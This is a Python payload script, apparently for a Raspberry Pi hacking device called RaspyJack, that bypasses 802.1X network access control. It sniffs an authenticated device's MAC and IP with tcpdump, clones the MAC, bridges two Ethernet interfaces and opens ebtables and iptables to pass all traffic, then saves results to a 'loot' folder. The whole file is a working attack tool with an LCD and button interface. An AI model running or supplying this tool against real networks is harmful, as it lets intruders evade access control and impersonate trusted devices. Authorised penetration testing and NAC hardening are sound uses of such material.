#!/usr/bin/env python3
"""
RaspyJack Payload -- 802.1X NAC Bypass via Transparent Bridge
==============================================================
Author: 7h30th3r0n3

Bypasses 802.1X/NAC enforcement by creating a transparent bridge
between two Ethernet interfaces and cloning the authenticated
device's MAC and IP addresses.

Setup / Prerequisites
---------------------
- 2 Ethernet interfaces (eth0 + eth1 via USB adapter)
- apt install bridge-utils ebtables

Steps:
  1) Detect 2 Ethernet interfaces (eth0 + USB adapter)
  2) Sniff traffic on eth0 to capture MAC/IP of legitimate device
  3) Clone MAC onto eth1
  4) Create transparent bridge br0 with no IP
  5) Enable forwarding + ebtables/iptables passthrough
  6) Pi can inject own traffic using cloned identity

Controls:
  OK        -- Start bypass
  UP / DOWN -- Scroll info
  KEY1      -- Toggle injection mode
  KEY2      -- Export captured data
  KEY3      -- Exit + full cleanup

Loot: /root/Raspyjack/loot/NACBypass/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/NACBypass"
os.makedirs(LOOT_DIR, exist_ok=True)

BRIDGE = "br0"
ROWS_VISIBLE = 7

# ---------------------------------------------------------------------------
# Shared state (protected by lock)
# ---------------------------------------------------------------------------
lock = threading.Lock()
status_msg = "Detecting interfaces..."
detected_mac = ""
detected_ip = ""
bridge_state = "down"
packets_fwd = 0
injection_mode = False
scroll_pos = 0
view_mode = "status"  # status | info
running = True
bypass_active = False
log_lines = []

# Original MACs for cleanup
_original_macs = {}
_ifaces = []
_sniff_proc = None
_tcpdump_proc = None

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run(cmd, timeout=10):
    """Run a command and return CompletedProcess."""
    return subprocess.run(
        cmd, capture_output=True, text=True, timeout=timeout,
    )


def _run_silent(cmd, timeout=10):
    """Run a command, ignore errors."""
    try:
        subprocess.run(cmd, capture_output=True, timeout=timeout)
    except Exception:
        pass


def _get_mac(iface):
    """Read the current MAC address of an interface."""
    try:
        with open(f"/sys/class/net/{iface}/address", "r") as fh:
            return fh.read().strip()
    except Exception:
        return ""


def _list_eth_ifaces():
    """Return list of Ethernet interfaces with carrier."""
    ifaces = []
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if name in ("lo", BRIDGE):
                continue
            if not name.startswith(("eth", "en", "usb")):
                continue
            try:
                with open(f"/sys/class/net/{name}/carrier") as fh:
                    if fh.read().strip() == "1":
                        ifaces.append(name)
            except Exception:
                pass
    except Exception:
        pass
    return ifaces


def _add_log(msg):
    """Thread-safe log append."""
    ts = datetime.now().strftime("%H:%M:%S")
    with lock:
        log_lines.append(f"[{ts}] {msg}")


# ---------------------------------------------------------------------------
# Sniffing for MAC/IP of authenticated device
# ---------------------------------------------------------------------------

def _sniff_identity(iface):
    """Sniff ARP/DHCP traffic on iface to extract MAC and IP."""
    global detected_mac, detected_ip, _sniff_proc
    _add_log(f"Sniffing on {iface}...")

    try:
        _sniff_proc = subprocess.Popen(
            ["sudo", "tcpdump", "-i", iface, "-nn", "-e", "-c", "50",
             "-l", "arp or (udp port 67 or udp port 68)"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
        )
    except Exception as exc:
        _add_log(f"tcpdump failed: {exc}")
        return

    mac_candidates = {}
    ip_pattern = re.compile(r"(\d+\.\d+\.\d+\.\d+)")
    mac_pattern = re.compile(r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})", re.I)

    try:
        for line in iter(_sniff_proc.stdout.readline, ""):
            if not running:
                break
            macs = mac_pattern.findall(line)
            ips = ip_pattern.findall(line)
            for m in macs:
                low = m.lower()
                if low in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
                    continue
                for ip_addr in ips:
                    if ip_addr.startswith("255.") or ip_addr == "0.0.0.0":
                        continue
                    mac_candidates[low] = ip_addr

            if mac_candidates:
                chosen_mac = next(iter(mac_candidates))
                chosen_ip = mac_candidates[chosen_mac]
                with lock:
                    detected_mac = chosen_mac
                    detected_ip = chosen_ip
                _add_log(f"Found: MAC={chosen_mac} IP={chosen_ip}")
                break
    except Exception:
        pass
    finally:
        if _sniff_proc and _sniff_proc.poll() is None:
            _sniff_proc.terminate()


# ---------------------------------------------------------------------------
# Bridge setup / teardown
# ---------------------------------------------------------------------------

def _setup_bridge(iface_a, iface_b):
    """Create transparent bridge between two interfaces."""
    global bridge_state

    _add_log(f"Creating bridge {BRIDGE}: {iface_a} <-> {iface_b}")

    # Save original MACs
    _original_macs[iface_a] = _get_mac(iface_a)
    _original_macs[iface_b] = _get_mac(iface_b)

    # Clone MAC onto second interface
    if detected_mac:
        _run_silent(["sudo", "ip", "link", "set", iface_b, "down"])
        _run_silent(["sudo", "ip", "link", "set", iface_b, "address", detected_mac])
        _run_silent(["sudo", "ip", "link", "set", iface_b, "up"])
        _add_log(f"Cloned MAC {detected_mac} to {iface_b}")

    # Create bridge
    _run_silent(["sudo", "ip", "link", "add", "name", BRIDGE, "type", "bridge"])
    _run_silent(["sudo", "ip", "link", "set", BRIDGE, "up"])

    # Remove IPs from slave interfaces
    _run_silent(["sudo", "ip", "addr", "flush", "dev", iface_a])
    _run_silent(["sudo", "ip", "addr", "flush", "dev", iface_b])

    # Add interfaces to bridge
    _run_silent(["sudo", "ip", "link", "set", iface_a, "master", BRIDGE])
    _run_silent(["sudo", "ip", "link", "set", iface_b, "master", BRIDGE])

    # Enable forwarding
    _run_silent(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])

    # Ebtables: transparent passthrough
    _run_silent(["sudo", "ebtables", "-F"])
    _run_silent(["sudo", "ebtables", "-P", "FORWARD", "ACCEPT"])
    _run_silent(["sudo", "ebtables", "-P", "INPUT", "ACCEPT"])
    _run_silent(["sudo", "ebtables", "-P", "OUTPUT", "ACCEPT"])

    # Iptables: allow forwarded traffic
    _run_silent(["sudo", "iptables", "-F", "FORWARD"])
    _run_silent(["sudo", "iptables", "-A", "FORWARD", "-i", BRIDGE, "-j", "ACCEPT"])

    with lock:
        bridge_state = "up"
    _add_log("Bridge is UP, transparent mode active")


def _teardown_bridge():
    """Remove bridge, restore MACs, disable forwarding."""
    global bridge_state
    _add_log("Tearing down bridge...")

    for iface in _ifaces:
        _run_silent(["sudo", "ip", "link", "set", iface, "nomaster"])

    _run_silent(["sudo", "ip", "link", "set", BRIDGE, "down"])
    _run_silent(["sudo", "ip", "link", "del", BRIDGE])

    # Restore original MACs
    for iface, mac in _original_macs.items():
        if mac:
            _run_silent(["sudo", "ip", "link", "set", iface, "down"])
            _run_silent(["sudo", "ip", "link", "set", iface, "address", mac])
            _run_silent(["sudo", "ip", "link", "set", iface, "up"])

    # Cleanup firewall and forwarding
    _run_silent(["sudo", "ebtables", "-F"])
    _run_silent(["sudo", "iptables", "-F", "FORWARD"])
    _run_silent(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])

    with lock:
        bridge_state = "down"
    _add_log("Bridge torn down, MACs restored")


# ---------------------------------------------------------------------------
# Packet counter thread
# ---------------------------------------------------------------------------

def _packet_counter():
    """Count forwarded packets via /proc/net/dev for br0."""
    global packets_fwd
    prev_rx = 0
    while running:
        try:
            with open("/proc/net/dev", "r") as fh:
                for line in fh:
                    if BRIDGE in line:
                        parts = line.split()
                        rx = int(parts[1])
                        if prev_rx > 0:
                            with lock:
                                packets_fwd += (rx - prev_rx)
                        prev_rx = rx
                        break
        except Exception:
            pass
        time.sleep(1)


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    """Export captured data to loot directory."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    data = {
        "timestamp": ts,
        "detected_mac": detected_mac,
        "detected_ip": detected_ip,
        "bridge_state": bridge_state,
        "packets_forwarded": packets_fwd,
        "injection_mode": injection_mode,
        "log": list(log_lines),
    }
    path = os.path.join(LOOT_DIR, f"nac_bypass_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        _add_log(f"Exported to {path}")
    except Exception as exc:
        _add_log(f"Export failed: {exc}")


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "NAC Bypass", fill="CYAN", font=font)

    with lock:
        st = status_msg
        mac = detected_mac or "---"
        ip = detected_ip or "---"
        bs = bridge_state
        pf = packets_fwd
        inj = injection_mode
        sp = scroll_pos
        vm = view_mode
        lines = list(log_lines)

    if vm == "status":
        draw.text((2, 16), f"St: {st}", fill="WHITE", font=font)
        draw.text((2, 28), f"MAC: {mac[:17]}", fill="GREEN", font=font)
        draw.text((2, 40), f"IP:  {ip}", fill="GREEN", font=font)
        draw.text((2, 52), f"Bridge: {bs}", fill="YELLOW", font=font)
        draw.text((2, 64), f"Pkts: {pf}", fill="WHITE", font=font)
        inj_label = "ON" if inj else "OFF"
        draw.text((2, 76), f"Inject: {inj_label}", fill="RED" if inj else "GRAY", font=font)
        draw.text((2, 92), "OK=start UP/DN=scroll", fill="GRAY", font=font)
        draw.text((2, 104), "K1=inject K2=export", fill="GRAY", font=font)
        draw.text((2, 116), "K3=exit", fill="GRAY", font=font)
    else:
        visible = lines[sp:sp + ROWS_VISIBLE]
        y = 16
        for line in visible:
            draw.text((2, y), line[:21], fill="WHITE", font=font)
            y += 14
        draw.text((2, 116), "OK=back UP/DN=scroll", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Bypass start thread
# ---------------------------------------------------------------------------

def _start_bypass():
    """Main bypass flow: sniff, bridge, count."""
    global status_msg, bypass_active

    with lock:
        status_msg = "Finding interfaces..."

    ifaces = _list_eth_ifaces()
    if len(ifaces) < 2:
        with lock:
            status_msg = f"Need 2 ETH, found {len(ifaces)}"
        _add_log(f"Only {len(ifaces)} Ethernet iface(s) detected")
        return

    _ifaces.clear()
    _ifaces.extend(ifaces[:2])
    _add_log(f"Using: {_ifaces[0]} and {_ifaces[1]}")

    with lock:
        status_msg = "Sniffing for device..."
    _sniff_identity(_ifaces[0])

    if not detected_mac:
        with lock:
            status_msg = "No device found, bridging anyway"
        _add_log("No MAC/IP captured, creating bridge with original MACs")

    with lock:
        status_msg = "Setting up bridge..."
    _setup_bridge(_ifaces[0], _ifaces[1])

    counter_thread = threading.Thread(target=_packet_counter, daemon=True)
    counter_thread.start()

    with lock:
        status_msg = "Bypass active"
        bypass_active = True
    _add_log("NAC bypass operational")


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    global running, scroll_pos, view_mode, injection_mode, status_msg

    try:
        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    if not bypass_active:
                        t = threading.Thread(target=_start_bypass, daemon=True)
                        t.start()
                    elif view_mode == "info":
                        view_mode = "status"

            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    if view_mode == "info":
                        max_scroll = max(0, len(log_lines) - ROWS_VISIBLE)
                        if scroll_pos < max_scroll:
                            scroll_pos += 1
                    else:
                        view_mode = "info"
                        scroll_pos = 0

            elif btn == "KEY1":
                with lock:
                    injection_mode = not injection_mode
                    _add_log(f"Injection mode: {'ON' if injection_mode else 'OFF'}")

            elif btn == "KEY2":
                threading.Thread(target=_export_data, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False

        if _sniff_proc and _sniff_proc.poll() is None:
            _sniff_proc.terminate()
        if _tcpdump_proc and _tcpdump_proc.poll() is None:
            _tcpdump_proc.terminate()

        if bypass_active:
            _teardown_bridge()

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 56), "NAC Bypass stopped", fill="RED", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()


if __name__ == "__main__":
    main()
